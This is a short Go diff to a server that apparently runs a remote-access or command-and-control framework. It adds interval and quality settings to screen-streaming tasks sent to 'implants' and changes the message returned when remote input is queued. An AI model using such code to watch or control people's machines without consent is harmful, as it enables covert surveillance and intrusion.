@@ -518,7 +518,22 @@ func (s *Server) handleStartScreenMonitor(c *gin.Context) {
 	s.screenMonitorImplants[strings.ToLower(id)] = time.Now()
 	s.screenMonitorMu.Unlock()
 
-	task, err := s.createTask(id, "screen_stream_start", "", "", "", "", 0, 0)
+	interval := c.PostForm("interval")
+	if interval == "" {
+		interval = c.Query("interval")
+	}
+	quality := c.PostForm("quality")
+	if quality == "" {
+		quality = c.Query("quality")
+	}
+	if interval == "" {
+		interval = "5"
+	}
+	if quality == "" {
+		quality = "medium"
+	}
+	streamCmd := interval + "," + quality
+	task, err := s.createTask(id, "screen_stream_start", streamCmd, "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Screen monitor: failed to create task", "agent_id", id, "err", err)
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
@@ -612,7 +627,7 @@ func (s *Server) handleAgentRemoteInput(c *gin.Context) {
 
 	s.LogAuditRecord(c, "remote_input", "agent", id, fmt.Sprintf("Remote input: %s", req.Type), true, nil)
 	s.broadcastTaskUpdate(id, *task)
-	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": "remote input queued (agent stub)"})
+	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": "remote input queued"})
 }
 
 func (s *Server) handleScreenFrame(c *gin.Context) {
